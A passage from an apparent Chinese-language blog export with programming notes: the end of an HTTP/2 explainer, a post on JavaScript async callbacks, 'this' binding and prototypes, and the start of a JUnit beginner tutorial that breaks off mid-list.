<h4 id="3-2-2-帧"><a href="#3-2-2-帧" class="headerlink" title="3.2.2. 帧"></a>3.2.2. 帧</h4><p>帧的结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-----------------------------------------------+</span><br><span class="line">|                 Length (24)                   |</span><br><span class="line">+---------------+---------------+---------------+</span><br><span class="line">|   Type (8)    |   Flags (8)   |</span><br><span class="line">+-+-------------+---------------+-------------------------------+</span><br><span class="line">|R|                 Stream Identifier (31)                      |</span><br><span class="line">+=+=============================================================+</span><br><span class="line">|                   Frame Payload (0...)                      ...</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>主要字段的含义如下：</p>
<ul>
<li><code>Length</code>：帧的长度。</li>
<li><code>Type</code>：帧的类型。</li>
<li><code>Stream Identifier</code>：流标识，指明该帧属于哪一个报文（流）。</li>
<li><code>Frame Payload</code>：主体内容，由 <code>Type</code> 决定，其中包含了所承载的数据。</li>
</ul>
<p>更详细的字段解析，可查看博客和官方文档。</p>
<h4 id="3-2-3-多路复用"><a href="#3-2-3-多路复用" class="headerlink" title="3.2.3. 多路复用"></a>3.2.3. 多路复用</h4><p>这也就是上文所提到的：发送方将 HTTP&#x2F;2 报文（流）分解成不同的帧，并将属于不同 HTTP&#x2F;2 报文（流）的帧合并在一个 TCP 报文中，然后发送，最后接收方再把它们重新组装起来。</p>
<p>正是由于 HTTP&#x2F;2 的多路复用，<strong>对于同一个域名，浏览器只需创建一个 TCP 连接</strong>。</p>
<h4 id="3-2-4-优先级"><a href="#3-2-4-优先级" class="headerlink" title="3.2.4. 优先级"></a>3.2.4. 优先级</h4><p>由于可以同时发送多个 HTTP&#x2F;2 报文的帧，那么，优先发送哪些报文的帧，就成了一个问题。</p>
<p>在 HTTP&#x2F;2 中，每个 HTTP&#x2F;2 报文（流）都可以被分配优先级，优先级高的先发送。</p>
<h4 id="3-2-5-流量控制"><a href="#3-2-5-流量控制" class="headerlink" title="3.2.5. 流量控制"></a>3.2.5. 流量控制</h4><p>由于接收方需要缓存每个报文已接受的帧（所有帧到达后，再拼接起来），所以，为了防止发送方发送过快过多，导致接收方缓存溢出，HTTP&#x2F;2 提供了流量控制。</p>
<p>这与 <strong>TCP 流量控制</strong> 大同小异。</p>
<h3 id="3-3-服务端推送"><a href="#3-3-服务端推送" class="headerlink" title="3.3. 服务端推送"></a>3.3. 服务端推送</h3><p>HTTP&#x2F;2 新增的第三个强大新功能就是：<strong>服务器可以对一个客户端请求发送多个响应</strong>。换句话说，除了对最初请求的响应外，服务器还可以向客户端推送额外资源，而无需客户端明确地请求。</p>
<p><img src="/grpc%E8%BF%9B%E9%98%B6-HTTP-2%5C3.png" alt="1"></p>
<p>这是不是类似于 Websocket ？</p>
<h2 id="4-HTTP-x2F-1-1-与-HTTP-x2F-2-性能对比"><a href="#4-HTTP-x2F-1-1-与-HTTP-x2F-2-性能对比" class="headerlink" title="4. HTTP&#x2F;1.1 与 HTTP&#x2F;2 性能对比"></a>4. HTTP&#x2F;1.1 与 HTTP&#x2F;2 性能对比</h2><p>测试网站：<a href="https://http2.akamai.com/demo">https://http2.akamai.com/demo</a></p>
<p><img src="/grpc%E8%BF%9B%E9%98%B6-HTTP-2%5C4.png" alt="1"></p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><ul>
<li><a href="https://juejin.im/post/6844903667569541133#heading-64">HTTP2 详解</a></li>
<li><a href="https://httpwg.org/specs/rfc7540.html#Overview">RFC 7540</a></li>
<li><a href="https://developers.google.com/web/fundamentals/performance/http2?hl=zh-cn#top_of_page">HTTP&#x2F;2 简介</a></li>
</ul>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>grpc</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript重难点</title>
    <url>/javascript%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>记录js使用过程中遇到的重难点。</p>
<span id="more"></span>

<h2 id="1-异步问题"><a href="#1-异步问题" class="headerlink" title="1. 异步问题"></a>1. 异步问题</h2><p>js中大部分库函数（比如：setTimeout、ajax请求）都是<strong>异步</strong>的，即调用时不等待函数执行结束，就执行下一步。（这是为了浏览器的性能，JavaScript会将异步函数在主线程之外执行）</p>
<p>示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;f1()&quot;</span>)</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;f2()&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f1</span>()</span><br><span class="line"><span class="title function_">f2</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// f2()</span></span><br><span class="line"><span class="comment">// f1()</span></span><br></pre></td></tr></table></figure>

<p>如果，一定要让<code>f2()</code>在<code>f1()</code>执行完<code>setTimeout()</code>之后执行，解决异步问题的一个简单办法是传入<strong>回调函数</strong>，改为：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params">f</span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;f1()&quot;</span>)</span><br><span class="line">    <span class="title function_">f</span>()</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;f2()&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f1</span>(f2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">// f1()</span></span><br><span class="line"><span class="comment">// f2()</span></span><br></pre></td></tr></table></figure>

<h2 id="2-this-指针"><a href="#2-this-指针" class="headerlink" title="2. this 指针"></a>2. this 指针</h2><h3 id="2-1-匿名函数中this指向调用者对象，而箭头函数中的this指向上一层调用者对象"><a href="#2-1-匿名函数中this指向调用者对象，而箭头函数中的this指向上一层调用者对象" class="headerlink" title="2.1. 匿名函数中this指向调用者对象，而箭头函数中的this指向上一层调用者对象"></a>2.1. 匿名函数中this指向调用者对象，而箭头函数中的this指向上一层调用者对象</h3><p>示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;tom&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;tomcat&#x27;</span>,</span><br><span class="line">  <span class="attr">getName</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);  <span class="comment">// 输出 window对象</span></span><br><span class="line">    <span class="comment">// 由于箭头函数，this指针指向上一层对象，即全局对象，因此这里的this.name是全局中的name变量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">getName</span>()); <span class="comment">// 输出 tom</span></span><br></pre></td></tr></table></figure>

<p>所以，在对象的方法定义中，<strong>不建议使用箭头函数</strong>。</p>
<h3 id="2-2-在回调函数中使用this指针的问题"><a href="#2-2-在回调函数中使用this指针的问题" class="headerlink" title="2.2. 在回调函数中使用this指针的问题"></a>2.2. 在回调函数中使用this指针的问题</h3><p>首先：</p>
<ul>
<li>对象A传入回调函数至对象B的方法后，该回调函数中的<code>this</code>不会指向对象B。</li>
</ul>
<p>其次：</p>
<ul>
<li>function定义的函数内部的<code>this</code>指向于此函数的调用者（拥有者）</li>
<li>箭头函数中的<code>this</code>指向上一层调用者对象</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">  <span class="title function_">g</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;obj1&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 接收一个回调函数，并调用它</span></span><br><span class="line">  <span class="title function_">f</span>(<span class="params">callback=<span class="literal">undefined</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">typeof</span>(callback) == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="title function_">callback</span>() <span class="comment">// 执行回调函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;</span><br><span class="line">  <span class="title function_">g</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;obj2&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    obj1.<span class="title function_">f</span>(<span class="function">() =&gt;</span> &#123;<span class="variable language_">this</span>.<span class="title function_">g</span>()&#125;) <span class="comment">// 若换成 obj1.f(function() &#123;this.g()&#125;)，则会报错</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj2.<span class="title function_">f</span>() <span class="comment">// 输出：obj2</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-将对象A的方法赋给对象B的方法后。对象B调用该方法时，方法中this指针指向对象B"><a href="#2-3-将对象A的方法赋给对象B的方法后。对象B调用该方法时，方法中this指针指向对象B" class="headerlink" title="2.3. 将对象A的方法赋给对象B的方法后。对象B调用该方法时，方法中this指针指向对象B"></a>2.3. 将对象A的方法赋给对象B的方法后。对象B调用该方法时，方法中this指针指向对象B</h3><p>以下的为反面教材：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wsManager = &#123;</span><br><span class="line">  <span class="attr">callback</span>: undefine,</span><br><span class="line">  <span class="attr">ws</span>: <span class="literal">null</span>,</span><br><span class="line">  <span class="title function_">initWebSocket</span>(<span class="params">vue</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;init websocket&#x27;</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ws</span> = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;xxxxx&#x27;</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ws</span>.<span class="property">onopen</span> = <span class="variable language_">this</span>.<span class="property">websocketOpen</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ws</span>.<span class="property">onclose</span> = <span class="variable language_">this</span>.<span class="property">websocketClose</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ws</span>.<span class="property">onerror</span> = <span class="variable language_">this</span>.<span class="property">websocketError</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ws</span>.<span class="property">onmessage</span> = <span class="variable language_">this</span>.<span class="property">websocketOnMessage</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// call on websocket connected</span></span><br><span class="line">  <span class="title function_">websocketOpen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;websocket connected&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// call on websocket disconnected</span></span><br><span class="line">  <span class="title function_">websocketClose</span>(<span class="params">msg</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;websocket disconnected&#x27;</span>, msg)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// call on websocket error</span></span><br><span class="line">  <span class="title function_">websocketError</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;websocket error&#x27;</span>, e)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// call on receive message</span></span><br><span class="line">  <span class="title function_">websocketOnMessage</span>(<span class="params">msg</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">typeof</span>(<span class="variable language_">this</span>.<span class="property">callback</span>) == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">callback</span>() <span class="comment">// 执行回调函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// websocket发送信息函数</span></span><br><span class="line">  <span class="title function_">sendCommand</span>(<span class="params">_callback=<span class="literal">undefined</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callback</span> = _callback</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wsManager.<span class="title function_">sendCommand</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;congratulations&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>后，当<code>websocketOnMessage()</code>函数接收到信息时，<code>this.callback()</code>为<code>undefine</code>。为什么呢？</p>
<p>因为传入<code>wsManager.sendCommand()</code>的回调函数，只赋给了<code>wsManager</code>对象中的<code>callback</code>属性，而未赋给<code>wsManager.ws</code>对象中的<code>callback</code>属性。</p>
<p>而调用<code>wsManager.ws.onmessage = wsManager.websocketOnMessage()</code>函数的为<code>wsManager.ws</code>对象，却并不是<code>wsManager</code>对象。</p>
<p>所以，<code>wsManager.ws.onmessage()</code>函数中的<code>this.callback</code>指向<code>wsManager.ws.callback</code>，而不指向<code>wsManager.callback</code>，因此为<code>undefine</code>。</p>
<h2 id="3-console-log-的神秘输出"><a href="#3-console-log-的神秘输出" class="headerlink" title="3. console.log() 的神秘输出"></a>3. console.log() 的神秘输出</h2><p>在控制台输入以下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">name</span>)</span><br><span class="line">a.<span class="property">name</span> = <span class="string">&quot;666&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">name</span>)</span><br></pre></td></tr></table></figure>

<p>将会输出：</p>
<p><img src="/javascript%E9%87%8D%E9%9A%BE%E7%82%B9/1.png" alt="pic"></p>
<p>咋一看，没什么问题。但是，当你展开两个对象的括号时：</p>
<p><img src="/javascript%E9%87%8D%E9%9A%BE%E7%82%B9/2.png" alt="pic"></p>
<p>你会发现，第一个对象的输出中，竟然也有<code>name</code>属性，这是为什么呢？？？</p>
<p>因为，在js中对象是引用类型，所以<code>console.log()</code>拿到的对象值相当于<strong>指针</strong>。而在控制台中，当你展开输出对象的花括号时，控制台<strong>会重新从指针指向的内存中取值</strong>，所以，你会看到第二次添加的<code>name</code>属性出现在第一次的对象输出中。</p>
<p>而且，在你展开输出对象的花括号时，花括号旁边会出现一个<code>i</code>字符，鼠标放上去后，它会告诉你：</p>
<p><img src="/javascript%E9%87%8D%E9%9A%BE%E7%82%B9/3.png" alt="pic"></p>
<p><code>Value below was evaluated just now.</code>下面的值刚刚才被估计。</p>
<p>同样，引用类型——数组也是如此：</p>
<p><img src="/javascript%E9%87%8D%E9%9A%BE%E7%82%B9/4.png" alt="pic"><br><img src="/javascript%E9%87%8D%E9%9A%BE%E7%82%B9/5.png" alt="pic"></p>
<h2 id="4-原型链"><a href="#4-原型链" class="headerlink" title="4. 原型链"></a>4. 原型链</h2><p><img src="/javascript%E9%87%8D%E9%9A%BE%E7%82%B9/7.png" alt="pic"></p>
<p>事情的起因，JavaScript被要求模仿Java，于是加入了<code>new</code>操作符：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">FunctionName</span>()</span><br></pre></td></tr></table></figure>

<p>虽然JavaScript是面向对象的语言，但它不是基于类的语言，它是一种基于原型的语言。</p>
<p>所以，<code>FunctionName</code>并不是类，而是<strong>构造函数</strong>，<code>JavaScript</code>是通过构造函数来创建对象的：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Obj</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">printInfo</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj1 = <span class="keyword">new</span> <span class="title class_">Obj</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="keyword">new</span> <span class="title class_">Obj</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">obj1.<span class="title function_">printInfo</span>() <span class="comment">// 输出 1</span></span><br><span class="line">obj2.<span class="title function_">printInfo</span>() <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure>

<p>不过，对于上述例子有个问题，如果多个实例对象通过同一个构造函数创建。虽然它们拥有各自的姓名，但它们的方法都是相同的，而每创建一个实例，都要创建相同的方法。这样并不节省内存。</p>
<p>在<code>Java</code>中，我们可以通过继承解决这个问题；而在<code>JavaScript</code>中，我们则通过**原型(prototype)**：</p>
<ul>
<li>每一个构造函数都拥有一个<code>prototype</code>属性，这个属性指向一个原型对象。当使用这个构造函数创建实例的时候，<code>prototype</code>属性指向的原型对象就成为实例的原型对象。</li>
<li>原型对象默认拥有一个<code>constructor</code>属性，指向指向它的那个构造函数（也就是说构造函数和原型对象是互指的关系）。</li>
<li>每个对象都拥有一个隐藏的属性，指向它的原型对象，这个属性可以通过 <code>Object.getPrototypeOf(obj)</code> 或 <code>obj.__proto__</code> 来访问。</li>
<li>实际上，构造函数的<code>prototype</code>属性与它创建的实例对象的<code>__proto__</code>属性指向的是同一个原型对象，即 <code>对象.__proto__ === 函数.prototype</code> 。</li>
<li>所有的对象都是由它的原型对象<strong>继承</strong>而来。</li>
<li>所有的对象都可以作为原型对象存在。</li>
<li>访问对象的属性时，JavaScript会首先在对象自身的属性内查找，若没有找到，则会跳转到该对象的原型对象中查找。</li>
</ul>
<p>对于上述例子，我们只需要如下改造：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Obj</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Obj</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">printInfo</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj1 = <span class="keyword">new</span> <span class="title class_">Obj</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="keyword">new</span> <span class="title class_">Obj</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">obj1.<span class="title function_">printInfo</span>() <span class="comment">// 输出 1</span></span><br><span class="line">obj2.<span class="title function_">printInfo</span>() <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure>

<p>此时，我们输出<code>obj</code>，可以看到：</p>
<p><img src="/javascript%E9%87%8D%E9%9A%BE%E7%82%B9/6.png" alt="pic"></p>
<p><code>obj</code>对象的<code>__proto__</code>属性指向它的原型对象，原型对象的<code>constructor</code>属性指向构造函数，原型对象的<code>__proto__</code>属性指向终极原型对象<code>Object</code>。这就是<strong>原型链</strong>。</p>
<p>同样，子类可以覆盖父类的方法，即对象可以覆盖原型对象的方法。</p>
<p>参考：</p>
<ul>
<li><a href="https://juejin.im/post/5a94c0de5188257a8929d837">三分钟看完JavaScript原型与原型链</a></li>
<li><a href="https://juejin.im/post/5dc26f55e51d456e35627301">轻松理解JS 原型原型链</a></li>
</ul>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>junit入门</title>
    <url>/junit%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>结合之前卓越班《软件开发环境与工具》课程所教的junit，以及此次的软件测试大赛，决定入门学习一下<code>junit</code>。</p>
<p>此处使用<code>IDEA</code>作为开发工具。</p>
<span id="more"></span>

<h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h2><ol>
<li><p><code>IDEA</code>新建一个java空项目，即新建项目页面什么都不选，直接next：</p>
<p> <img src="/junit%E5%85%A5%E9%97%A8/demo1.png" alt="demo"></p>
</li>
<li><p>新建项目成功后，需要导入项目的依赖包(即junit包)。</p>
</li>
</ol>
<ul>
<li><p>右键项目根目录 - 选择<code>Open Module Settings</code> - 点击项目<code>Dependencies</code>(依赖配置) - 点击窗口右侧的绿色<code>+</code>按键 - 选择第1项<code>JARs or directories...</code>；</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo2.png" alt="demo"></p>
</li>
<li><p>找到<code>IDEA安装目录/lib/</code>目录，在该目录中找到<code>junit-4.12.jar</code>包，点击<code>OK</code>；</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo3.png" alt="demo"></p>
</li>
<li><p>用同样的方式，导入<code>hamcrest-core-1.3.jar</code>包(也在<code>IDEA安装目录/lib/</code>目录下)。<code>junit4.12</code>依赖于该包，若不导入该包，<code>junit4</code>运行则会报错。最终项目依赖列表如下：</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo4.png" alt="demo"></p>
</li>
<li><p>在项目<code>src/</code>目录下新建<code>main</code>和<code>test</code>包(即目录)，也可以不新建，个人喜好。最终项目结构和外部依赖如下：</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo5.png" alt="demo"></p>
</li>
</ul>
<h2 id="2-开始"><a href="#2-开始" class="headerlink" title="2. 开始"></a>2. 开始</h2><h3 id="2-1-编写计算器类，包含加减乘除四个函数"><a href="#2-1-编写计算器类，包含加减乘除四个函数" class="headerlink" title="2.1. 编写计算器类，包含加减乘除四个函数"></a>2.1. 编写计算器类，包含加减乘除四个函数</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a * b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a / b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-编写测试类，使用断言"><a href="#2-2-编写测试类，使用断言" class="headerlink" title="2.2. 编写测试类，使用断言"></a>2.2. 编写测试类，使用断言</h3><p>在<code>test</code>目录下，新建<code>CalculatorTest</code>测试类，内容如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> main.Calculator;</span><br><span class="line"><span class="keyword">import</span> org.junit.Assert;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment">* <span class="doctag">@project</span> junitDemo</span></span><br><span class="line"><span class="comment">* <span class="doctag">@class</span> CalculatorTest</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> douNine</span></span><br><span class="line"><span class="comment">* <span class="doctag">@date</span> 2019/6/23 11:40</span></span><br><span class="line"><span class="comment">* <span class="doctag">@description</span> TODO</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">        Assert.assertEquals(<span class="string">&quot;add error&quot;</span>, result, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">subTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.sub(<span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">        Assert.assertEquals(<span class="string">&quot;sub error&quot;</span>, result, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mulTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.mul(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">        Assert.assertEquals(<span class="string">&quot;mul error&quot;</span>, result, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">divTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.div(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        Assert.assertEquals(<span class="string">&quot;div error&quot;</span>, result, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>junit</code>中的断言：</p>
<ul>
<li><code>assertEquals()</code>: 如果比较的两个对象是相等的，此方法将正常返回；否则失败显示在JUnit的窗口测试将中止。</li>
<li><code>assertSame()</code> 和 <code>assertNotSame()</code>: 方法测试两个对象引用指向完全相同的对象。</li>
<li><code>assertNull()</code> 和 <code>assertNotNull()</code>: 方法测试一个变量是否为空或不为空(null)。</li>
<li><code>assertTrue()</code> 和 <code>assertFalse()</code>: 方法测试if条件或变量是true还是false。</li>
<li><code>assertArrayEquals()</code>: 将比较两个数组，如果它们相等，则该方法将继续进行不会发出错误。否则失败将显示在JUnit窗口和中止测试。</li>
</ul>
<h3 id="2-3-编写出现Error和Failure的测试用例，并分析区别"><a href="#2-3-编写出现Error和Failure的测试用例，并分析区别" class="headerlink" title="2.3. 编写出现Error和Failure的测试用例，并分析区别"></a>2.3. 编写出现Error和Failure的测试用例，并分析区别</h3><ul>
